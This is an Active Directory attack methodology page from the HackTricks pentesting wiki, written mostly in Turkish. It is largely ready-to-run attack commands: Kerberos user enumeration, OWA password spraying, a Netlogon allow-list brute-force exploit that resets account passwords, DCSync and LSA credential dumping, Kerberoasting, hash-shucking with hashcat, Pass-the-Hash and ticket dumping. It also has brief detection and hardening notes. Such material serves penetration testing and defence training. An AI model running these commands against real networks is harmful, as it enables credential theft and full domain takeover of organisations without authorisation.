# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory**, **network administrators**ın ağ içinde **domains**, **users** ve **objects** oluşturup yönetmesini sağlayan temel bir teknolojidir. Ölçeklenebilir olacak şekilde tasarlanmıştır; çok sayıda kullanıcıyı yönetilebilir **groups** ve **subgroups** içine organize etmeyi kolaylaştırırken, çeşitli seviyelerde **access rights** kontrolü sağlar.

**Active Directory** yapısı üç ana katmandan oluşur: **domains**, **trees** ve **forests**. Bir **domain**, ortak bir veritabanını paylaşan **users** veya **devices** gibi nesnelerden oluşan bir koleksiyonu kapsar. **Trees**, ortak bir yapı ile birbirine bağlı bu domain gruplarıdır ve bir **forest**, **trust relationships** ile birbirine bağlanan birden fazla tree’nin koleksiyonunu temsil eder; bu da organizasyon yapısının en üst katmanını oluşturur. Bu seviyelerin her birinde belirli **access** ve **communication rights** tanımlanabilir.

**Active Directory** içindeki temel kavramlar şunlardır:

1. **Directory** – Active Directory nesnelerine ilişkin tüm bilgileri barındırır.
2. **Object** – Dizindeki varlıkları ifade eder; bunlara **users**, **groups** veya **shared folders** dahildir.
3. **Domain** – Directory nesneleri için bir kapsayıcı görevi görür; bir **forest** içinde birden fazla domain bir arada bulunabilir ve her biri kendi nesne koleksiyonunu korur.
4. **Tree** – Ortak bir root domain paylaşan domain gruplandırmasıdır.
5. **Forest** – Active Directory’de organizasyon yapısının zirvesidir; aralarında **trust relationships** bulunan birkaç tree’den oluşur.

**Active Directory Domain Services (AD DS)**, bir ağ içinde merkezi yönetim ve iletişim için kritik olan bir dizi hizmeti kapsar. Bu hizmetler şunları içerir:

1. **Domain Services** – Veri depolamayı merkezileştirir ve **users** ile **domains** arasındaki etkileşimleri yönetir; buna **authentication** ve **search** işlevleri dahildir.
2. **Certificate Services** – Güvenli **digital certificates** oluşturulmasını, dağıtılmasını ve yönetilmesini denetler.
3. **Lightweight Directory Services** – **LDAP protocol** üzerinden directory-enabled uygulamaları destekler.
4. **Directory Federation Services** – Kullanıcıları tek bir oturumda birden fazla web uygulaması arasında doğrulamak için **single-sign-on** yetenekleri sağlar.
5. **Rights Management** – Telifli materyalin yetkisiz dağıtımını ve kullanımını düzenleyerek korunmasına yardımcı olur.
6. **DNS Service** – **domain names** çözümlemesi için kritiktir.

Daha ayrıntılı açıklama için şuraya bakın: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

**Bir AD’ye saldırmayı** öğrenmek için **Kerberos authentication process**’i gerçekten iyi **anlamak** gerekir.\
[**Hâlâ nasıl çalıştığını bilmiyorsanız bu sayfayı okuyun.**](kerberos-authentication.md)

## Cheat Sheet

AD’yi enumerate/exploit etmek için çalıştırabileceğiniz komutları hızlıca görmek adına [https://wadcoms.github.io/](https://wadcoms.github.io) adresine göz atabilirsiniz.

> [!WARNING]
> Kerberos communication, işlem yapmak için **tam nitelikli ad (FQDN)** gerektirir. Eğer bir makineye IP adresiyle erişmeye çalışırsanız, **NTLM kullanır ve kerberos kullanmaz**.

## Recon Active Directory (No creds/sessions)

Eğer bir AD ortamına erişiminiz varsa ama hiçbir credentials/sessions yoksa şunları yapabilirsiniz:

- **Pentest the network:**
- Ağı tarayın, makineleri ve açık portları bulun ve **vulnerabilities** exploit etmeye veya bunlardan **credentials** çıkarmaya çalışın (örneğin, [printers could be very interesting targets](ad-information-in-printers.md)).
- DNS enumerate etmek, domain içindeki web, printers, shares, vpn, media vb. kritik server’lar hakkında bilgi verebilir.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Bunu nasıl yapacağınıza dair daha fazla bilgi için genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) bölümüne bakın.
- **SMB servislerinde null ve Guest access kontrolü yapın** (bu, modern Windows sürümlerinde çalışmaz):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bir SMB server’ını nasıl enumerate edeceğinize dair daha ayrıntılı bir rehber burada bulunabilir:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap enumerate edin**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP’yi nasıl enumerate edeceğinize dair daha ayrıntılı bir rehber burada bulunabilir (özellikle **anonymous access**’e dikkat edin):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Ağ poisoning yapın**
- [**Responder ile servisleri taklit ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credentials toplayın
- [**relay attack’i kötüye kullanarak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host’a erişin
- [**evil-S** ile sahte UPnP servisleri**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) açığa çıkararak credentials toplayın
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Domain ortamları içinde ve ayrıca herkese açık kaynaklarda yer alan internal documents, social media, services (özellikle web) içinden usernames/names çıkarın.
- Şirket çalışanlarının tam adlarını bulursanız, farklı AD **username conventions (**[**bunu okuyun**](https://activedirectorypro.com/active-directory-user-naming-convention/)) denemeyi düşünebilirsiniz. En yaygın convention’lar şunlardır: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
- **Kerbrute enum**: Bir **invalid username** istendiğinde server, **Kerberos error** kodu _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ ile yanıt verir; bu da username’in geçersiz olduğunu anlamamızı sağlar. **Valid usernames** ise ya **AS-REP** yanıtında **TGT**’yi ya da _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatasını döndürür; bu da kullanıcının pre-authentication yapması gerektiğini gösterir.
- **MS-NRPC’ye karşı Authentication yok**: Domain controller’larda MS-NRPC (Netlogon) interface’ine karşı auth-level = 1 (No authentication) kullanımı. Bu yöntem, kimlik bilgisi olmadan kullanıcının veya bilgisayarın var olup olmadığını kontrol etmek için MS-NRPC interface’ine bağlandıktan sonra `DsrGetDcNameEx2` fonksiyonunu çağırır. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool’u bu tür enumerate işlemini uygular. Araştırma [burada](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf) bulunabilir.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Sunucusu**

Eğer ağda bu sunuculardan birini bulduysanız, buna karşı **kullanıcı enumerasyonu** da yapabilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Kullanıcı adları listelerini [**bu github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) ve bunu da ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) içinde bulabilirsiniz.
>
> Ancak, bundan önce yapmış olmanız gereken recon adımından şirket içinde çalışan kişilerin **adına** sahip olmalısınız. Ad ve soyad ile, olası geçerli kullanıcı adlarını üretmek için [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanabilirsiniz.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

**Zerologon** DC üzerinde patch'lense bile, açıkça allow-list'e alınmış hesaplar yine de **legacy/vulnerable Netlogon secure-channel davranışına** maruz kalabilir. Riskli konfigürasyon, GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** veya eşleşen registry değeri **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**'tir.

Bu değer bir **SDDL security descriptor**'dır ([Security Descriptors](security-descriptors.md) bölümüne bakın). DACL içinde ilgili ACE verilen herhangi bir hesap veya grup hedeflenebilir. Örneğin, `O:BAG:BAD:(A;;RC;;;WD)` etkili olarak **Everyone**'ı allow-list'e alır.

Pratik operator iş akışı:

1. **SYSVOL/GPO** ve **canlı DC registry**'sini kontrol ederek allow-list'e alınmış principal'ları belirleyin.
2. SDDL içinde bulunan **SID**'leri gerçek AD user/computer'lara eşleyin ve **DC machine accounts**, **trust accounts** ve diğer ayrıcalıklı makineleri önceliklendirin.
3. Allow-list'e alınmış hesap olarak tekrar tekrar **MS-NRPC / Netlogon authentication** denemesi yapın.
4. Başarılı bir tahminden sonra, hedef hesap parolasını sıfırlamak için **Netlogon password-setting** istismar edin (public PoC bunu boş string olarak ayarlar).

Public artifact'tan hızlı triage / lab örnekleri:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notlar:

- **scanner** faydalıdır çünkü etkili allow-list **SYSVOL** içinde, **registry** içinde veya her ikisinde de bulunabilir.
- Exploit yolu 자체 önemlidir çünkü savunmasız bir hesap tanımlandıktan sonra **Domain Admin privileges** gerektirmez.
- `DC$` gibi bir **Domain Controller machine account** ele geçirmek özellikle tehlikelidir çünkü bu parolanın sıfırlanması doğrudan daha geniş **AD takeover** yollarını etkinleştirebilir.
- **Brute-force feasibility** moda bağlıdır: public artifact bir meet-in-the-middle yaklaşımını, başka bir computer account mevcutken **24-bit** brute force’u ve daha yavaş **32-bit** varyantları tanımlar.

Detection / hardening notları:

- Allow-list policy’yi denetleyin ve geçici, açıkça gerekli compatibility exception’lar dışında her şeyi kaldırın.
- DC **System** event’leri **5827/5828/5829/5830/5831**’i izleyerek savunmasız Netlogon bağlantılarının policy tarafından reddedildiğini, keşfedildiğini veya açıkça izin verildiğini yakalayın.
- `VulnerableChannelAllowList` içindeki hesapları, legacy dependency kaldırılana kadar **high-risk** olarak değerlendirin.

### Bir veya birkaç username bilmek

Tamam, elinizde zaten geçerli bir username var ama password yok... O zaman deneyin:

- [**ASREPRoast**](asreproast.md): Bir user’ın _DONT_REQ_PREAUTH_ attribute’u **yoksa**, o user için password’un bir türeviyle şifrelenmiş bazı data içeren bir **AS_REP message** isteyebilirsiniz.
- [**Password Spraying**](password-spraying.md): Bulunan her user ile en **common passwords**’leri deneyelim; belki bir user kötü bir password kullanıyordur (password policy’yi unutmayın!).
- Ayrıca kullanıcıların mail server’larına erişim elde etmek için **OWA servers** üzerinde de **spray** yapabileceğinizi unutmayın.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ağdaki bazı protokolleri **poisoning** yaparak kırmak için bazı challenge **hashes** **obtain** edebilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory’yi enumerate etmeyi başardıysanız, **daha fazla email** ve **network** hakkında daha iyi bir anlayışa sahip olursunuz. AD ortamına erişim elde etmek için NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) zorlamayı deneyebilirsiniz.

### NetExec workspace-driven recon & relay posture checks

- AD recon durumunu her engagement için ayrı tutmak üzere **`nxcdb` workspaces** kullanın: `workspace create <name>` komutu `~/.nxc/workspaces/<name>` altında protokol başına SQLite DB’ler oluşturur (smb/mssql/winrm/ldap/etc). Görünümler arasında `proto smb|mssql|winrm` ile geçiş yapın ve toplanan secrets’ları `creds` ile listeleyin. İşiniz bitince sensitive data’yı manuel olarak temizleyin: `rm -rf ~/.nxc/workspaces/<name>`.
- **`netexec smb <cidr>`** ile hızlı subnet discovery, **domain**, **OS build**, **SMB signing requirements** ve **Null Auth** bilgilerini gösterir. `(signing:False)` gösteren member’lar **relay-prone**’dur, DC’ler ise çoğu zaman signing gerektirir.
- Target etmeyi kolaylaştırmak için NetExec çıktısından doğrudan **/etc/hosts** içine **hostnames** üretin:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to DC signing tarafından engellendiğinde** bile **LDAP** durumunu kontrol et: `netexec ldap <dc>` `(signing:None)` / zayıf channel binding değerlerini gösterir. SMB signing required ama LDAP signing disabled olan bir DC, **SPN-less RBCD** gibi kötüye kullanımlar için hâlâ uygun bir **relay-to-LDAP** hedefidir.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs bazen **maskelenmiş admin şifrelerini HTML içine gömer**. Kaynak/devtools görüntülemek cleartext’i açığa çıkarabilir (ör. `<input value="<password>">`), bu da scan/print repositories’ye Basic-auth erişimi sağlar.
- Alınan print jobs, kullanıcı başına şifreler içeren **plaintext onboarding docs** içerebilir. Test ederken eşleşmeleri hizalı tut:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Eğer **null veya guest user** ile **diğer PC’lere veya shares** erişebiliyorsanız, **dosyalar** (örneğin bir SCF dosyası) yerleştirebilirsiniz; bunlara bir şekilde erişilirse **size karşı bir NTLM authentication tetiklenir**, böylece **NTLM challenge**’ını **steal** edip crack edebilirsiniz:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**, sahip olduğunuz her NT hash’i, anahtar materyali doğrudan NT hash’ten türetilen diğer, daha yavaş formatlar için bir aday parola olarak ele alır. Kerberos RC4 tickets, NetNTLM challenges veya cached credentials üzerinde uzun passphrase’leri brute-force etmek yerine, NT hash’leri Hashcat’in NT-candidate modlarına verirsiniz ve düz metni hiç öğrenmeden password reuse olup olmadığını doğrulatırsınız. Bu, özellikle domain compromise sonrasında binlerce güncel ve geçmiş NT hash toplayabildiğinizde çok etkilidir.

Shucking’i şu durumlarda kullanın:

- DCSync, SAM/SECURITY dumps veya credential vaults’ten bir NT corpus’unuz varsa ve diğer domain/forest’lerde reuse test etmek istiyorsanız.
- RC4 tabanlı Kerberos materyali (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses veya DCC/DCC2 blobs yakalıyorsanız.
- Uzun, crack edilemeyen passphrase’ler için reuse’u hızlıca kanıtlamak ve hemen Pass-the-Hash ile pivot yapmak istiyorsanız.

Bu teknik, anahtarları NT hash olmayan encryption types’a karşı çalışmaz (ör. Kerberos etype 17/18 AES). Domain yalnızca AES zorunlu kılıyorsa, normal password modlarına dönmeniz gerekir.

#### Bir NT hash corpus’u oluşturma

- **DCSync/NTDS** – Mümkün olan en büyük NT hash kümesini (ve önceki değerlerini) almak için `secretsdump.py`’yi history ile kullanın:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History girdileri aday havuzunu ciddi şekilde genişletir çünkü Microsoft hesap başına 24 önceki hash saklayabilir. NTDS secrets toplamanın daha fazla yolu için bakın:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`) local SAM/SECURITY verisini ve cached domain logons (DCC/DCC2) çıkarır. Bunları deduplicate edin ve aynı `nt_candidates.txt` listesine ekleyin.
- **Metadata takibi** – Her hash’i üreten kullanıcı adını/domain’i saklayın (wordlist yalnızca hex içerse bile). Hashcat kazanan candidate’ı yazdığında, eşleşen hash size hangi principal’ın password reuse yaptığını hemen gösterir.
- Aynı forest veya trusted forest içinden gelen adayları tercih edin; shucking sırasında overlap şansını maksimize eder.

#### Hashcat NT-candidate modları

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notlar:

- NT-candidate girişleri **ham 32-hex NT hash** olarak kalmalıdır. Rule engine’leri devre dışı bırakın (`-r` yok, hybrid mode yok), çünkü mangling candidate key material’i bozar.
- Bu modlar doğası gereği daha hızlı değildir, ancak NTLM keyspace’i (M3 Max üzerinde yaklaşık 30,000 MH/s) Kerberos RC4’ten (~300 MH/s) yaklaşık 100× daha hızlıdır. Seçilmiş bir NT listesi test etmek, yavaş formatta tüm password space’i taramaktan çok daha ucuzdur.
- Her zaman **en güncel Hashcat build**’ini çalıştırın (`git clone https://github.com/hashcat/hashcat && make install`) çünkü modes 31500/31600/35300/35400 yakın zamanda geldi.
- AS-REQ Pre-Auth için şu anda NT mode yoktur ve AES etypes (19600/19700) düz metin password gerektirir; çünkü key’leri raw NT hash’lerden değil, UTF-16LE passwords üzerinden PBKDF2 ile türetilir.

#### Örnek – Kerberoast RC4 (mode 35300)

1. Düşük yetkili bir user ile hedef SPN için bir RC4 TGS yakalayın (detaylar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Ticket’ı NT listenizle shuck edin:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat, RC4 key’i her NT candidate’tan türetir ve `$krb5tgs$23$...` blob’unu doğrular. Bir eşleşme, service account’un mevcut NT hash’lerinizden birini kullandığını doğrular.

3. Hemen PtH ile pivot yapın:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Gerekirse düz metni daha sonra `hashcat -m 1000 <matched_hash> wordlists/` ile de kurtarabilirsiniz.

#### Örnek – Cached credentials (mode 31600)

1. Ele geçirilmiş bir workstation’dan cached logons dump edin:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. İlgili domain user için DCC2 satırını `dcc2_highpriv.txt` içine kopyalayın ve shuck edin:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Başarılı bir eşleşme, listenizde zaten bilinen NT hash’i üretir ve cached user’ın password reuse yaptığını kanıtlar. Bunu doğrudan PtH için kullanın (`nxc smb <dc_ip> -u highpriv -H <hash>`) veya string’i kurtarmak için hızlı NTLM mode’da brute-force edin.

Aynı iş akışı NetNTLM challenge-responses (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Eşleşme bulunduğunda relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash’i maskeler/rules ile offline olarak yeniden crack edebilirsiniz.



## Enumerating Active Directory WITH credentials/session

Bu aşama için **compromised credentials** veya geçerli bir domain account’un session’ını ele geçirmiş olmanız gerekir. Geçerli credentials’ınız veya domain user olarak bir shell’iniz varsa, **önceki seçeneklerin hâlâ diğer user’ları compromise etmek için kullanılabilir olduğunu** unutmamalısınız.

Authenticated enumeration’a başlamadan önce **Kerberos double hop problem**’inin ne olduğunu bilmelisiniz.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Bir account’u compromise etmek, **tüm domain’i compromise etmeye başlamak için büyük bir adımdır**, çünkü artık **Active Directory Enumeration** yapmaya başlayabilirsiniz:

[**ASREPRoast**](asreproast.md) açısından artık olası her vulnerable user’ı bulabilirsiniz ve [**Password Spraying**](password-spraying.md) açısından ise **tüm username’lerin bir listesini** alıp compromise edilen account’un şifresini, boş şifreleri ve yeni umut verici şifreleri deneyebilirsiniz.

- [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) kullanabilirsiniz
- Daha stealthy olduğu için [**powershell for recon**](../basic-powershell-for-pentesters/index.html) da kullanabilirsiniz
- Daha ayrıntılı bilgi çıkarmak için [**use powerview**](../basic-powershell-for-pentesters/powerview.md) da kullanabilirsiniz
- Active directory’de recon için bir diğer harika tool [**BloodHound**](bloodhound.md). Çok stealthy değildir (kullandığınız collection methods’a bağlı olarak), ama **bununla ilgilenmiyorsanız**, kesinlikle denemelisiniz. User’ların nereden RDP yapabildiğini, diğer gruplara giden path’leri vb. bulun.
- **Diğer otomatik AD enumeration tools şunlardır:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- **AD’nin DNS records**’ları da ilginç bilgi içerebilir.
- Directory’yi enumerate etmek için kullanabileceğiniz **GUI’li bir tool**: **SysInternal** Suite’ten **AdExplorer.exe**.
- LDAP database içinde **ldapsearch** ile _userPassword_ ve _unixUserPassword_ alanlarında, hatta _Description_ içinde credentials arayabilirsiniz. Diğer yöntemler için cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Eğer **Linux** kullanıyorsanız, domain’i [**pywerview**](https://github.com/the-useless-one/pywerview) ile de enumerate edebilirsiniz.
- Ayrıca şu automated tools’ları da deneyebilirsiniz:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain user’larını çıkarmak**

Windows’tan tüm domain usernames’lerini almak çok kolaydır (`net user /domain` ,`Get-DomainUser` veya `wmic useraccount get name,sid`). Linux’ta şunları kullanabilirsiniz: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>`

> Bu Enumeration bölümü küçük görünse bile en önemli kısımdır. Linkleri açın (özellikle cmd, powershell, powerview ve BloodHound olanları), bir domain’in nasıl enumerate edileceğini öğrenin ve kendinizi rahat hissedene kadar pratik yapın. Bir assessment sırasında bu, DA’ya ulaşmanın yolunu bulmak veya hiçbir şey yapılamayacağına karar vermek için kilit an olacaktır.

### Kerberoast

Kerberoasting, kullanıcı account’larına bağlı service’ler tarafından kullanılan **TGS tickets** elde etmeyi ve bunların encryption’ını crack etmeyi içerir — bu encryption user passwords’a dayanır — **offline**.

Bunun hakkında daha fazlası için:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Bazı credentials elde ettikten sonra herhangi bir **machine**’e erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için, port scan’lerinize uygun olarak farklı protocol’lerle birkaç server’a bağlanmayı denemek için **CrackMapExec** kullanabilirsiniz.

### Local Privilege Escalation

Eğer compromised credentials veya regular domain user olarak bir session elde ettiyseniz ve bu user ile domain içindeki **herhangi bir machine**’e **access** sahibiyseniz, local olarak privileges yükseltmenin ve credentials looting yapmanın yollarını aramalısınız. Bunun nedeni, yalnızca local administrator privileges ile memory’de (LSASS) ve local olarak (SAM) **diğer user’ların hash’lerini dump** edebilmenizdir.

Bu kitapta [**Windows’ta local privilege escalation**](../windows-local-privilege-escalation/index.html) ve bir [**checklist**](../checklist-windows-privilege-escalation.md) hakkında eksiksiz bir sayfa var. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı unutmayın.

### Current Session Tickets

Geçerli user’da size beklenmedik resources’lara erişim izni veren **tickets** bulmanız çok **olası değildir**, ancak şunları kontrol edebilirsiniz:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Eğer active directory’yi enumerate etmeyi başardıysan, **daha fazla e-postaya ve ağın daha iyi bir anlayışına** sahip olursun. NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.** zorlamayı deneyebilirsin

### Looks for Creds in Computer Shares | SMB Shares

Artık bazı temel credentials’a sahip olduğuna göre, **AD içinde paylaşılan herhangi bir ilginç dosya** bulup bulamayacağını kontrol etmelisin. Bunu manuel yapabilirsin ama bu çok sıkıcı, tekrarlayan bir iştir (özellikle kontrol etmen gereken yüzlerce doküman bulursan).

[**Kullanabileceğin tools hakkında bilgi edinmek için bu bağlantıyı takip et.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Eğer başka PC’lere veya shares’e **erişebiliyorsan**, bir SCF dosyası gibi, bir şekilde erişildiğinde sana karşı **NTLM authentication** tetikleyecek **dosyalar yerleştirebilirsin**; böylece onu crack etmek için **NTLM challenge**’ını **çalabilirsin**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Bu vulnerability, kimliği doğrulanmış herhangi bir kullanıcının **domain controller’ı compromise etmesine** izin veriyordu.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Aşağıdaki teknikler için sıradan bir domain user yeterli değildir; bu saldırıları gerçekleştirmek için bazı özel privileges/credentials gerekir.**

### Hash extraction

Umarım [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) relaying dahil, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) kullanarak bir **local admin** hesabını compromise etmeyi başarmışsındır.\
Sonra, bellekte ve lokal olarak bulunan tüm hash’leri dump etme zamanı.\
[**Hash’leri elde etmenin farklı yolları hakkında bu sayfayı oku.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Bir kullanıcının hash’ine sahip olduktan sonra**, onu **taklit etmek** için kullanabilirsin.\
Bu hash’i kullanarak **NTLM authentication gerçekleştirecek** bir **tool** kullanman gerekir, **veya** yeni bir **sessionlogon** oluşturup bu hash’i **LSASS** içine **inject** edebilirsin; böylece herhangi bir **NTLM authentication** yapıldığında, o hash kullanılır. Son seçenek mimikatz’ın yaptığı şeydir.\
[**Daha fazla bilgi için bu sayfayı oku.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bu saldırı, yaygın Pass The Hash’in NTLM protocol üzerinden yaptığı gibi, **kullanıcının NTLM hash’ini kullanarak Kerberos tickets istemeyi** amaçlar. Bu nedenle, özellikle **NTLM protocol’ünün devre dışı bırakıldığı** ve kimlik doğrulama protokolü olarak yalnızca **Kerberos’un izin verildiği** ağlarda **yararlı** olabilir.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

